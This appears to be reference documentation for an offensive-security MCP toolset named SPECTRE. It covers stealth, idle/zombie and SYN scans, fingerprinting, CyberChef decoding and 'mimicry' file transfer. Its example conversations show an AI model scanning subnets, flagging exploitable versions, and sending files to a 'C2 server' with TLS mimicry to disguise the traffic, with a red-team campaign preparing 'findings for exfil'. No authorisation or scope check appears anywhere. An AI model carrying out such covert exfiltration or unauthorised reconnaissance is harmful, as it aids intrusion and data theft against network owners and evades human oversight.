# SPECTRE MCP Tools Reference

**Version:** 0.1.0 | **Last Updated:** 2026-02-04

---

## Overview

SPECTRE exposes its capabilities through the Model Context Protocol (MCP), enabling AI assistants like Claude and Cursor to perform security operations through natural language commands.

---

## Configuration

### Claude Code

Add to `~/.config/claude/config.json`:

```json
{
  "mcpServers": {
    "spectre": {
      "command": "spectre-mcp",
      "args": ["serve"],
      "env": {
        "SPECTRE_CONFIG": "/path/to/spectre.toml"
      }
    }
  }
}
```

### Claude Desktop

**macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
**Windows:** `%APPDATA%/Claude/claude_desktop_config.json`

```json
{
  "mcpServers": {
    "spectre": {
      "command": "spectre-mcp",
      "args": ["serve"]
    }
  }
}
```

### Cursor

In Settings > Features > MCP:

```json
{
  "name": "SPECTRE",
  "type": "command",
  "command": "spectre-mcp",
  "args": ["serve"]
}
```

---

## Tool Categories

SPECTRE MCP exposes approximately 500 tools organized into categories:

| Category | Prefix | Tool Count | Description |
|----------|--------|------------|-------------|
| Scan | `spectre_scan_*` | 12 | Network scanning operations |
| Detect | `spectre_detect_*` | 4 | Service/OS detection |
| Chef | `spectre_chef_*` | 463+ | CyberChef operations |
| Transfer | `spectre_transfer_*` | 4 | Secure file transfer |
| Campaign | `spectre_campaign_*` | 8 | Campaign management |
| Workflow | `spectre_workflow_*` | 4 | Workflow execution |

---

## Scan Tools

### spectre_scan_syn

TCP SYN (half-open) scan.

```json
{
  "name": "spectre_scan_syn",
  "arguments": {
    "target": "192.168.1.0/24",
    "ports": "1-1000",
    "rate": 1000,
    "timeout": 3000,
    "service_detection": true
  }
}
```

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `target` | string | Yes | Target IP, CIDR, range, or hostname |
| `ports` | string | No | Port specification (default: "1-1000") |
| `rate` | number | No | Max packets/second (default: 1000) |
| `timeout` | number | No | Probe timeout in ms (default: 3000) |
| `service_detection` | boolean | No | Enable service detection |
| `os_detection` | boolean | No | Enable OS fingerprinting |

**Returns:** Array of scan results with hosts, ports, and services.

### spectre_scan_connect

Full TCP connect scan (no privileges required).

```json
{
  "name": "spectre_scan_connect",
  "arguments": {
    "target": "scanme.nmap.org",
    "ports": "22,80,443,8080"
  }
}
```

### spectre_scan_udp

UDP scan with protocol-specific probes.

```json
{
  "name": "spectre_scan_udp",
  "arguments": {
    "target": "192.168.1.1",
    "ports": "53,161,123,500"
  }
}
```

### spectre_scan_fin / spectre_scan_null / spectre_scan_xmas

TCP stealth scans using various flag combinations.

```json
{
  "name": "spectre_scan_fin",
  "arguments": {
    "target": "192.168.1.0/24",
    "ports": "1-1000"
  }
}
```

### spectre_scan_ack

ACK scan for firewall rule mapping.

```json
{
  "name": "spectre_scan_ack",
  "arguments": {
    "target": "firewall.example.com",
    "ports": "1-1024"
  }
}
```

### spectre_scan_idle

Idle/zombie scan for maximum anonymity.

```json
{
  "name": "spectre_scan_idle",
  "arguments": {
    "target": "192.168.1.1",
    "zombie": "192.168.1.50",
    "ports": "80,443"
  }
}
```

---

## Detection Tools

### spectre_detect_service

Service version detection on discovered hosts.

```json
{
  "name": "spectre_detect_service",
  "arguments": {
    "hosts": [
      {"ip": "192.168.1.1", "ports": [22, 80, 443]}
    ],
    "intensity": 5
  }
}
```

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `hosts` | array | Yes | Hosts with open ports |
| `intensity` | number | No | Probe intensity 0-9 (default: 5) |

### spectre_detect_os

OS fingerprinting.

```json
{
  "name": "spectre_detect_os",
  "arguments": {
    "hosts": ["192.168.1.1", "192.168.1.2"]
  }
}
```

### spectre_detect_tls

TLS certificate analysis.

```json
{
  "name": "spectre_detect_tls",
  "arguments": {
    "hosts": [
      {"ip": "192.168.1.1", "port": 443}
    ]
  }
}
```

**Returns:** Certificate details including issuer, validity, SANs.

### spectre_detect_banner

Banner grabbing for specific ports.

```json
{
  "name": "spectre_detect_banner",
  "arguments": {
    "hosts": ["192.168.1.1"],
    "ports": [22, 21, 25, 110]
  }
}
```

---

## Chef Tools (CyberChef Operations)

### spectre_chef_bake

Execute a full CyberChef recipe.

```json
{
  "name": "spectre_chef_bake",
  "arguments": {
    "input": "SGVsbG8gV29ybGQh",
    "recipe": [
      {"op": "From_Base64"},
      {"op": "To_Hex", "args": {"delimiter": "Space"}}
    ]
  }
}
```

### Common Individual Operations

**Encoding/Decoding:**

```json
// Base64 decode
{"name": "spectre_chef_from_base64", "arguments": {"input": "SGVsbG8="}}

// Base64 encode
{"name": "spectre_chef_to_base64", "arguments": {"input": "Hello"}}

// Hex decode
{"name": "spectre_chef_from_hex", "arguments": {"input": "48656c6c6f"}}

// URL decode
{"name": "spectre_chef_url_decode", "arguments": {"input": "Hello%20World"}}
```

**Compression:**

```json
// Gunzip
{"name": "spectre_chef_gunzip", "arguments": {"input": "<gzipped_data>"}}

// Unzip
{"name": "spectre_chef_unzip", "arguments": {"input": "<zip_data>"}}
```

**Hashing:**

```json
// MD5
{"name": "spectre_chef_md5", "arguments": {"input": "test"}}

// SHA256
{"name": "spectre_chef_sha2", "arguments": {"input": "test", "size": 256}}

// BLAKE3
{"name": "spectre_chef_blake3", "arguments": {"input": "test"}}
```

**Extraction:**

```json
// Extract URLs
{"name": "spectre_chef_extract_urls", "arguments": {"input": "<text>"}}

// Extract IP addresses
{"name": "spectre_chef_extract_ip_addresses", "arguments": {"input": "<text>"}}

// Extract domains
{"name": "spectre_chef_extract_domains", "arguments": {"input": "<text>"}}

// Extract email addresses
{"name": "spectre_chef_extract_email_addresses", "arguments": {"input": "<text>"}}
```

**Encryption:**

```json
// AES decrypt
{
  "name": "spectre_chef_aes_decrypt",
  "arguments": {
    "input": "<encrypted>",
    "key": "<key>",
    "iv": "<iv>",
    "mode": "CBC"
  }
}

// XOR
{
  "name": "spectre_chef_xor",
  "arguments": {
    "input": "<data>",
    "key": "secret"
  }
}
```

### Recipe Management

```json
// Save recipe
{
  "name": "spectre_chef_recipe_save",
  "arguments": {
    "name": "decode-credentials",
    "recipe": [
      {"op": "From_Base64"},
      {"op": "URL_Decode"}
    ],
    "description": "Decode common credential encodings"
  }
}

// Execute saved recipe
{
  "name": "spectre_chef_recipe_execute",
  "arguments": {
    "name": "decode-credentials",
    "input": "<encoded_data>"
  }
}

// List recipes
{"name": "spectre_chef_recipe_list", "arguments": {}}
```

---

## Transfer Tools

### spectre_transfer_send

Send file to peer securely.

```json
{
  "name": "spectre_transfer_send",
  "arguments": {
    "file": "/path/to/report.pdf",
    "peer": "abc123...xyz",
    "encrypt": true,
    "mimicry": "tls",
    "compress": true
  }
}
```

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `file` | string | Yes | File path to send |
| `peer` | string | Yes | Peer ID or alias |
| `encrypt` | boolean | No | Enable encryption (default: true) |
| `mimicry` | string | No | Protocol: tls, websocket, doh |
| `compress` | boolean | No | Enable compression |

### spectre_transfer_receive

Start receiving files.

```json
{
  "name": "spectre_transfer_receive",
  "arguments": {
    "output_dir": "/path/to/downloads",
    "auto_accept": false,
    "accept_from": ["abc123"]
  }
}
```

### spectre_transfer_list_peers

List connected peers.

```json
{"name": "spectre_transfer_list_peers", "arguments": {}}
```

### spectre_transfer_connect

Connect to a peer.

```json
{
  "name": "spectre_transfer_connect",
  "arguments": {
    "peer_id": "abc123...xyz"
  }
}
```

---

## Campaign Tools

### spectre_campaign_create

Create a new campaign.

```json
{
  "name": "spectre_campaign_create",
  "arguments": {
    "name": "Operation BLACKOUT",
    "description": "Network reconnaissance of DMZ",
    "codename": "BLACKOUT",
    "targets": ["192.168.1.0/24", "10.0.0.0/16"]
  }
}
```

### spectre_campaign_run

Execute a campaign workflow.

```json
{
  "name": "spectre_campaign_run",
  "arguments": {
    "definition": {
      "name": "quick-recon",
      "phases": [
        {
          "name": "scan",
          "type": "scan",
          "config": {
            "scan_type": "syn",
            "ports": "1-1000"
          }
        },
        {
          "name": "analyze",
          "type": "chef",
          "depends_on": ["scan"],
          "config": {
            "recipe": "@extract-iocs"
          }
        }
      ]
    }
  }
}
```

### spectre_campaign_status

Get campaign status.

```json
{
  "name": "spectre_campaign_status",
  "arguments": {
    "campaign_id": "uuid-here"
  }
}
```

### spectre_campaign_list

List all campaigns.

```json
{"name": "spectre_campaign_list", "arguments": {}}
```

### spectre_campaign_pause / spectre_campaign_resume / spectre_campaign_abort

Control campaign execution.

```json
{
  "name": "spectre_campaign_pause",
  "arguments": {
    "campaign_id": "uuid-here"
  }
}
```

### spectre_campaign_export

Export campaign data.

```json
{
  "name": "spectre_campaign_export",
  "arguments": {
    "campaign_id": "uuid-here",
    "format": "json"
  }
}
```

---

## Workflow Tools

### spectre_workflow_run

Execute a workflow definition.

```json
{
  "name": "spectre_workflow_run",
  "arguments": {
    "definition": {
      "name": "scan-and-analyze",
      "steps": [
        {
          "id": "scan",
          "action": "spectre.scan",
          "config": {
            "type": "syn",
            "ports": "1-1000",
            "targets": "${targets}"
          }
        },
        {
          "id": "analyze",
          "action": "spectre.chef",
          "depends_on": ["scan"],
          "config": {
            "recipe": "Extract_URLs",
            "input": "${scan.output}"
          }
        }
      ]
    },
    "variables": {
      "targets": "192.168.1.0/24"
    }
  }
}
```

### spectre_workflow_validate

Validate a workflow definition.

```json
{
  "name": "spectre_workflow_validate",
  "arguments": {
    "definition": { ... }
  }
}
```

---

## Example Conversations

### Network Reconnaissance

**User:** "Scan 192.168.1.0/24 for web servers and identify their versions."

**Claude:**
```
I'll scan for web servers and detect their versions:

1. spectre_scan_syn({
     target: "192.168.1.0/24",
     ports: "80,443,8080,8443",
     service_detection: true
   })

Results:
- 192.168.1.10: nginx 1.18.0 (ports 80, 443)
- 192.168.1.15: Apache 2.4.41 (port 80)
- 192.168.1.20: Tomcat 9.0.50 (port 8080)
- 192.168.1.25: IIS 10.0 (ports 80, 443)

Found 4 web servers with varying versions. The Apache 2.4.41 and
Tomcat 9.0.50 instances may have known CVEs worth investigating.
```

### Data Analysis Pipeline

**User:** "I have a Base64-encoded, gzipped file. Extract all URLs and IP addresses from it."

**Claude:**
```
I'll decode and extract the indicators:

1. spectre_chef_from_base64({input: <file_contents>})
2. spectre_chef_gunzip({input: <decoded>})
3. spectre_chef_extract_urls({input: <decompressed>})
4. spectre_chef_extract_ip_addresses({input: <decompressed>})

Extracted IOCs:
URLs (15):
- https://malicious.example.com/payload
- http://c2.evil.net/beacon
- https://data-exfil.attacker.com/upload
...

IP Addresses (8):
- 203.0.113.42 (appears 12 times)
- 198.51.100.17 (appears 5 times)
- 192.0.2.100 (appears 3 times)
...

The IP 203.0.113.42 appears most frequently and should be
prioritized for investigation.
```

### Secure Exfiltration

**User:** "Send the analysis results to the C2 server using TLS mimicry."

**Claude:**
```
I'll securely transfer the findings:

1. spectre_transfer_send({
     file: "/tmp/analysis_results.json",
     peer: "c2-server",
     encrypt: true,
     mimicry: "tls",
     compress: true
   })

Transfer initiated:
- File: analysis_results.json (2.4 MB)
- Compression: enabled (reduced to 890 KB)
- Encryption: XChaCha20-Poly1305
- Protocol: TLS 1.3 mimicry
- Status: Completed
- Checksum verified by peer
```

### Full Campaign

**User:** "Create a red team campaign for the DMZ network. Scan for services, analyze banners, and prepare findings for exfil."

**Claude:**
```
I'll set up a structured campaign:

1. spectre_campaign_create({
     name: "Operation DMZ-RECON",
     description: "DMZ network reconnaissance",
     codename: "RECON-01",
     targets: ["dmz.example.com/24"]
   })

2. spectre_campaign_run({
     definition: {
       phases: [
         {name: "recon", type: "scan", config: {...}},
         {name: "analyze", type: "chef", depends_on: ["recon"], ...},
         {name: "report", type: "export", depends_on: ["analyze"], ...}
       ]
     }
   })

Campaign created and initiated:
- ID: 7f3a9c2b-...
- Status: ACTIVE
- Current phase: RECON (45% complete)

I'll monitor progress and provide updates.
```

---

## Error Handling

MCP tools return structured errors:

```json
{
  "error": {
    "code": "PERMISSION_DENIED",
    "message": "SYN scan requires CAP_NET_RAW capability",
    "suggestion": "Use spectre_scan_connect for unprivileged scanning"
  }
}
```

| Code | Description |
|------|-------------|
| `INVALID_INPUT` | Invalid parameters |
| `PERMISSION_DENIED` | Insufficient privileges |
| `COMPONENT_UNAVAILABLE` | Component not running |
| `NETWORK_ERROR` | Network operation failed |
| `TIMEOUT` | Operation timed out |
| `NOT_FOUND` | Resource not found |

---

## Best Practices

1. **Check component availability** before operations
2. **Use service detection** sparingly (slower)
3. **Specify ports** rather than scanning all
4. **Save recipes** for repeated operations
5. **Use campaigns** for complex multi-phase work
6. **Verify transfers** by checking return status
